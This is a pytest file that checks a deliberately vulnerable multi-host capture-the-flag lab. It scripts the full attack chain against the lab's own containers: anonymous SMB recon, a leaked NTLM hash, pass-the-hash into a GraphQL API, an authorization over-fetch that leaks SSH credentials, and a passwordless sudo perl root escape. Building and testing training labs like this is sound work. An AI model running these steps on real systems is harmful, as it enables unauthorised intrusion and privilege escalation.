"""Phase 18 verification: domainzero-master-twosites -- the Master tier
of "Domain Zero Directory". The first multi-host box either of this
project's two new games has needed, combining this game's one real
Samba AD DC precedent (domainzero-intermediate-domainedge) with the
established internal_groups/front_door multi-host pattern
(master-two-offices).

Two hosts: `frontdesk` (front door, a real Samba AD DC -- same
provisioning sequence, capabilities, and readiness timeout as
domainzero-intermediate-domainedge) and `backoffice` (internal-only,
never published, reachable over the shared internal network by its own
alias -- same pattern as master-two-offices' own backoffice host).

Headline techniques, climbing difficulty:
  - flags 1-3: anonymous SMB recon on frontdesk, including a legacy
    SAM-style credential dump for a "svc-backoffice" account, in classic
    username:RID:LM-hash:NTLM-hash::: format.
  - flag 4: GraphQL introspection against backoffice's hand-rolled
    /graphql endpoint reveals the `login` mutation's shape.
  - flag 5: PASS-THE-HASH -- the `login` mutation is called with the raw
    NTLM hash string from flag 3 as the credential (never cracked back
    to plaintext -- passing the hash IS the attack).
  - flag 6: an authenticated GraphQL query with no per-field
    authorization check (`record`'s `internalNotes` field ignores the
    record's own `role_required`) over-fetches an admin-only record,
    leaking a Linux SSH credential for a "boadmin" account on the SAME
    backoffice host -- a distinct bug from the pass-the-hash step.
  - flag 7: SSH foothold on backoffice as boadmin.
  - flags 8-10: a GTFOBins `perl` privesc (passwordless `sudo perl`,
    NOT reusing any GTFOBins binary already used elsewhere in this
    project -- less, tar, vi, python3, find, nmap, awk) to a root-only
    log (flag 8), a pre-root checkpoint note (flag 9), and root.txt
    (flag 10).

NETWORK TOPOLOGY / DESIGN FIX: `backoffice` has no published port at all
under either backend (DockerBackend never publishes ports for a
non-front-door host; KubernetesBackend only gives it a ClusterIP). A
real external player who steals a credential for it therefore needs an
actual network path to it that goes only through frontdesk's own
published ports -- so frontdesk runs a tiny protocol-unaware TCP relay
(see frontdesk/tcp_relay.py) forwarding its own ports 2222 and 4000 to
backoffice:22 and backoffice:4000 respectively. Every GraphQL and SSH
step below therefore talks to FRONTDESK's published host ports directly
from this test process, exactly the way a real external player would --
nothing here uses `docker exec` to fake connectivity into backoffice.
`docker exec` is used ONLY for the infrastructure-level topology checks
at the bottom of this file (backoffice really has no published port,
the relay's own alias-based path really works, cross-team isolation
holds) -- the same technique test_phase3_multihost.py's own `_exec`
helper already uses for every other multi-host box in this project.

DOCUMENTED SIMPLIFICATIONS (same spirit as every other box's own inline
comments):
  - The GraphQL API is hand-rolled (a single POST /graphql endpoint doing
    string-based dispatch on query/mutation shape), not a real GraphQL
    engine -- enough surface for introspection, auth, and a real
    authorization bug to all be genuinely exercisable, same philosophy
    as this project's fake IMDS / S3 mock.
  - Pass-the-hash is simplified honestly: this project's Samba AD DC
    doesn't give us a real Windows SAM or real over-the-wire NTLM auth,
    so the leaked "hash" is a fixed, documented opaque token that
    backoffice's login mutation accepts in place of the (deliberately
    unknowable) plaintext -- using the hash AS the credential, never
    cracking it, which is the actual defining behavior of pass-the-hash.

Requires the two box images already built
(ctf-boxes/domainzero-master-twosites-frontdesk:latest,
ctf-boxes/domainzero-master-twosites-backoffice:latest), `smbclient` and
`sshpass` on PATH (or, for smbclient, a `ctf-test-helpers/smbclient:latest`
image buildable from a plain `FROM ubuntu:22.04` + `apt-get install
smbclient` Dockerfile -- see `_smb_get` below), and a running
orchestrator reachable at ORCHESTRATOR_TEST_URL. Docker backend only.
"""
import hashlib
import hmac
import json
import os
import secrets as pysecrets
import shutil
import subprocess
import tempfile
import time

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "domainzero-master-twosites"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

FRONTDESK_SERVICE = "frontdesk"
BACKOFFICE_SERVICE = "backoffice"
BACKOFFICE_INTERNAL_PORT = 4000

SVC_BACKOFFICE_USERNAME = "svc-backoffice"
SVC_BACKOFFICE_NTLM_HASH = "8846f7eaee8fb117ad06bdd830b7586c"  # leaked via frontdesk's legacy backup share
BOADMIN_USERNAME = "boadmin"
BOADMIN_PASSWORD = "Back0ffice-Recovery-9x!"  # fixed/narrative -- discoverable only via the GraphQL over-fetch bug

# Whether a real `smbclient` binary is on PATH -- if not, fall back to a
# disposable helper container (built once, below) so this test still
# runs on a host that never installed Samba's client tools.
_HAVE_SMBCLIENT = shutil.which("smbclient") is not None
_SMB_HELPER_IMAGE = "ctf-test-helpers/smbclient:latest"


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _front_door_container(team_id: int) -> str:
    return f"ctf-{BOX_ID}-{team_id}-{FRONTDESK_SERVICE}"


def _internal_container(team_id: int) -> str:
    return f"ctf-{BOX_ID}-{team_id}-{BACKOFFICE_SERVICE}"


def _exec(container_name: str, *cmd: str) -> subprocess.CompletedProcess:
    return subprocess.run(["docker", "exec", container_name, *cmd], capture_output=True, text=True, timeout=30)


def _smb_get(host: str, port: int, share: str, filename: str) -> str:
    """Anonymous (guest) SMB fetch against frontdesk's published SMB
    port, straight from the test process -- every recon share in this
    box is deliberately guest-accessible, same as
    domainzero-noob-reception's own test conventions. Uses the host's
    own `smbclient` if present, else a disposable helper container on
    the host network (built once, from a bare `FROM ubuntu:22.04` +
    `apt-get install smbclient` Dockerfile -- no project code, just the
    one client tool this sandbox's host happened not to have)."""
    with tempfile.TemporaryDirectory() as tmp:
        local_path = os.path.join(tmp, "out")
        if _HAVE_SMBCLIENT:
            cmd = ["smbclient", f"//{host}/{share}", "-p", str(port), "-N", "-c", f"get {filename} {local_path}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            assert result.returncode == 0, f"smbclient failed: {result.stdout} {result.stderr}"
            with open(local_path) as f:
                return f.read()
        # Fallback: run smbclient inside a helper container, writing
        # straight to /dev/stdout so no shared volume is needed.
        cmd = [
            "docker", "run", "--rm", "--network", "host", _SMB_HELPER_IMAGE,
            "smbclient", f"//{host}/{share}", "-p", str(port), "-N", "-c", f"get {filename} /dev/stdout",
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        assert result.returncode == 0, f"smbclient (helper container) failed: {result.stdout} {result.stderr}"
        # Strip smbclient's own progress/status lines from the captured stdout.
        lines = [
            line for line in result.stdout.splitlines()
            if not (line.startswith("getting file") or line.startswith("Anonymous login"))
        ]
        return "\n".join(lines)


def _graphql(host: str, port: int, query: str, variables: dict | None = None, token: str | None = None) -> dict:
    """POSTs a GraphQL-shaped request to frontdesk's own published relay
    port (frontdesk:4000 -> backoffice:4000, see tcp_relay.py) -- real
    external reachability, no docker exec involved."""
    body = {"query": query}
    if variables:
        body["variables"] = variables
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    r = requests.post(f"http://{host}:{port}/graphql", json=body, headers=headers, timeout=15)
    return r.json()


def _ssh_backoffice(host: str, port: int, password: str, remote_command: str) -> subprocess.CompletedProcess:
    """SSHes to frontdesk's own published relay port (frontdesk:2222 ->
    backoffice:22) -- real external reachability, no docker exec
    involved."""
    return subprocess.run(
        [
            "sshpass", "-p", password, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"{BOADMIN_USERNAME}@{host}", remote_command,
        ],
        capture_output=True, text=True, timeout=20,
    )


def _escalate_via_perl(host: str, port: int, shell_command: str) -> str:
    """The box's one intended privesc on backoffice: boadmin has
    passwordless sudo on /usr/bin/perl -- the classic GTFOBins shell
    escape (`sudo perl -e 'exec "/bin/sh";'`), here invoked
    non-interactively over SSH to run a specific command as root, same
    technique, just scripted the way a one-shot SSH command would run
    it."""
    remote_cmd = 'sudo perl -e \'exec "/bin/sh", "-c", "{}";\''.format(shell_command)
    result = _ssh_backoffice(host, port, BOADMIN_PASSWORD, remote_cmd)
    assert result.returncode == 0, f"GTFOBins perl escalation failed: {result.stdout} {result.stderr}"
    return result.stdout


@pytest.fixture(scope="module", autouse=True)
def _ensure_smb_helper_image():
    """Builds the disposable smbclient helper image once per test run,
    only if the host itself has no smbclient binary on PATH."""
    if not _HAVE_SMBCLIENT:
        exists = subprocess.run(["docker", "image", "inspect", _SMB_HELPER_IMAGE], capture_output=True)
        if exists.returncode != 0:
            pytest.skip(f"smbclient not on PATH and helper image {_SMB_HELPER_IMAGE} not pre-built")
    yield


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_full_ten_flag_chain(box_instance):
    inst, secret, backend = box_instance
    host = inst["entry_host"]
    smb_port = _port(inst, 445)
    graphql_port = _port(inst, BACKOFFICE_INTERNAL_PORT)  # frontdesk's own relay port, same number as backoffice's
    ssh_port = _port(inst, 2222)  # frontdesk's own relay port -> backoffice:22

    # Flags 1-3: anonymous SMB recon on frontdesk.
    welcome = _smb_get(host, smb_port, "reception", "welcome.txt")
    assert expected_flag(secret, 1) in welcome

    ops_readme = _smb_get(host, smb_port, "ops-archive", "readme.txt")
    assert expected_flag(secret, 2) in ops_readme
    assert "backoffice" in ops_readme  # the hint toward the second internal site

    pwdump = _smb_get(host, smb_port, "ops-archive", "svc_backoffice_pwdump.bak")
    assert expected_flag(secret, 3) in pwdump
    assert SVC_BACKOFFICE_USERNAME in pwdump
    assert SVC_BACKOFFICE_NTLM_HASH in pwdump

    # Flag 4: GraphQL introspection against backoffice reveals the
    # `login` mutation's shape -- reached over frontdesk's own relay.
    introspection = _graphql(
        host, graphql_port,
        "query IntrospectionQuery { __schema { queryType { fields { name } } "
        "mutationType { fields { name description args { name } } } } }",
    )
    assert "errors" not in introspection
    mutation_fields = introspection["data"]["__schema"]["mutationType"]["fields"]
    login_field = next(f for f in mutation_fields if f["name"] == "login")
    assert expected_flag(secret, 4) in login_field["description"]
    assert {a["name"] for a in login_field["args"]} == {"username", "password"}

    # A wrong credential must actually be rejected -- the gate gates.
    denied = _graphql(
        host, graphql_port,
        'mutation { login(username: "svc-backoffice", password: "definitely-wrong") { token } }',
    )
    assert "errors" in denied

    # Flag 5: PASS-THE-HASH -- call `login` with the RAW NTLM hash string
    # pulled out of flag 3's own pwdump file, exactly as found, never
    # cracked back to a plaintext password.
    login_result = _graphql(
        host, graphql_port,
        'mutation { login(username: "svc-backoffice", password: "%s") { token flag } }' % SVC_BACKOFFICE_NTLM_HASH,
    )
    assert "errors" not in login_result, login_result
    assert expected_flag(secret, 5) == login_result["data"]["login"]["flag"]
    token = login_result["data"]["login"]["token"]
    assert token

    # An authenticated query for a record must still be denied with no token.
    unauthed = _graphql(host, graphql_port, "query { record(id: 2) { id title internalNotes } }")
    assert "errors" in unauthed

    # Flag 6: the GraphQL over-fetch / missing-field-authorization bug --
    # svc-backoffice's own low-privilege session can still read an
    # admin-only record's internalNotes field, leaking a SECOND, distinct
    # credential (boadmin's own Linux SSH password on backoffice itself).
    record = _graphql(host, graphql_port, "query { record(id: 2) { id title internalNotes } }", token=token)
    assert "errors" not in record, record
    notes = record["data"]["record"]["internalNotes"]
    assert expected_flag(secret, 6) in notes
    assert BOADMIN_USERNAME in notes
    assert BOADMIN_PASSWORD in notes

    # A record with role_required=None has no secrets -- sanity check
    # that this isn't just dumping flag 6 for any id.
    public_record = _graphql(host, graphql_port, "query { record(id: 1) { id title internalNotes } }", token=token)
    assert expected_flag(secret, 6) not in public_record["data"]["record"]["internalNotes"]

    # Flag 7: SSH foothold on backoffice as boadmin, using the credential
    # just leaked -- over frontdesk's own SSH relay.
    user_txt = _ssh_backoffice(host, ssh_port, BOADMIN_PASSWORD, "cat user.txt")
    assert user_txt.returncode == 0, user_txt.stderr
    assert expected_flag(secret, 7) in user_txt.stdout

    # A hint file pointing at the sudo/GTFOBins privesc.
    sudo_l = _ssh_backoffice(host, ssh_port, BOADMIN_PASSWORD, "sudo -l")
    assert "/usr/bin/perl" in sudo_l.stdout

    # Flag 8: a root-only file, read via the GTFOBins perl escape before
    # going for a full root shell.
    audit_log = _escalate_via_perl(host, ssh_port, "cat /var/log/backoffice_audit.log")
    assert expected_flag(secret, 8) in audit_log

    # Flags 9-10: full root access via the same escape.
    root_output = _escalate_via_perl(host, ssh_port, "cat /root/checkpoint_notes.txt /root/root.txt; id")
    assert expected_flag(secret, 9) in root_output
    assert expected_flag(secret, 10) in root_output
    assert "uid=0(root)" in root_output


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    inst, secret, backend = box_instance
    team_id_b = inst["team_id"] + 1000
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst["entry_host"], _port(inst, 445)
        host_b, port_b = inst_b["entry_host"], _port(inst_b, 445)
        welcome_a = _smb_get(host_a, port_a, "reception", "welcome.txt")
        welcome_b = _smb_get(host_b, port_b, "reception", "welcome.txt")
        assert expected_flag(secret, 1) in welcome_a
        assert expected_flag(secret_b, 1) in welcome_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in welcome_b
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


# --- Multi-host-specific infrastructure/topology checks, same shape as
# test_phase3_multihost.py. These use `docker exec` deliberately -- they
# are verifying the INTERNAL network topology (that backoffice itself
# has no published port, that the relay's own alias-based path to it
# works, that cross-team isolation holds at the network layer), not
# simulating a player's own path (which the tests above already cover
# end-to-end over published ports alone). ---

@pytest.fixture
def two_teams_docker():
    """Docker-backend-only fixture (this box's multi-host network checks
    below are infrastructure/topology checks, not full-chain checks, and
    the task that produced this file explicitly scopes verification to
    the Docker backend only)."""
    secret1 = pysecrets.token_hex(32)
    secret2 = pysecrets.token_hex(32)
    r1 = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": _TEAM_ID_BASE + 101, "box_id": BOX_ID, "team_secret": secret1, "backend": "docker"},
    )
    r1.raise_for_status()
    r2 = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": _TEAM_ID_BASE + 102, "box_id": BOX_ID, "team_secret": secret2, "backend": "docker"},
    )
    r2.raise_for_status()
    inst1, inst2 = r1.json(), r2.json()
    try:
        yield inst1, inst2
    finally:
        requests.delete(f"{BASE_URL}/instances/{inst1['instance_id']}")
        requests.delete(f"{BASE_URL}/instances/{inst2['instance_id']}")


def test_docker_internal_host_not_published(two_teams_docker):
    inst1, _inst2 = two_teams_docker
    name = _internal_container(inst1["team_id"])
    out = subprocess.run(
        ["docker", "inspect", "-f", "{{json .NetworkSettings.Ports}}", name],
        capture_output=True, text=True, check=True,
    )
    ports = json.loads(out.stdout)
    for proto_port, bindings in ports.items():
        assert bindings is None, f"backoffice must have no published ports, found {proto_port} -> {bindings}"


def test_docker_front_door_reaches_backoffice_by_alias(two_teams_docker):
    """The whole point of the alias fix: frontdesk's own container
    resolves and reaches "backoffice" literally, not the orchestrator's
    own container name -- this is also exactly the path tcp_relay.py
    itself depends on."""
    inst1, _inst2 = two_teams_docker
    fd1 = _front_door_container(inst1["team_id"])
    resolved = _exec(fd1, "getent", "hosts", BACKOFFICE_SERVICE)
    assert resolved.returncode == 0, f"frontdesk could not resolve backoffice's alias: {resolved.stderr}"

    reach = _exec(fd1, "timeout", "3", "bash", "-c", f"echo > /dev/tcp/{BACKOFFICE_SERVICE}/{BACKOFFICE_INTERNAL_PORT}")
    assert reach.returncode == 0, "frontdesk could not reach backoffice:4000 by alias"


def test_docker_cross_team_internal_isolation(two_teams_docker):
    """Team A's frontdesk must not reach team B's backoffice -- same
    per-team guarantee every other multi-host box in this project gets."""
    inst1, inst2 = two_teams_docker
    fd1 = _front_door_container(inst1["team_id"])
    team2_internal_name = _internal_container(inst2["team_id"])
    ip_out = subprocess.run(
        ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}", team2_internal_name],
        capture_output=True, text=True, check=True,
    )
    team2_ip = ip_out.stdout.split()[0]
    reach = _exec(fd1, "timeout", "3", "bash", "-c", f"echo > /dev/tcp/{team2_ip}/{BACKOFFICE_INTERNAL_PORT}")
    assert reach.returncode != 0, "team 1's frontdesk must not reach team 2's backoffice directly"


def test_docker_destroy_actually_tears_down(two_teams_docker):
    inst1, _inst2 = two_teams_docker
    team_id = inst1["team_id"]
    all_names = [_front_door_container(team_id), _internal_container(team_id)]
    requests.delete(f"{BASE_URL}/instances/{inst1['instance_id']}").raise_for_status()
    time.sleep(1)
    for name in all_names:
        result = subprocess.run(["docker", "inspect", name], capture_output=True)
        assert result.returncode != 0, f"{name} must be gone after destroy"
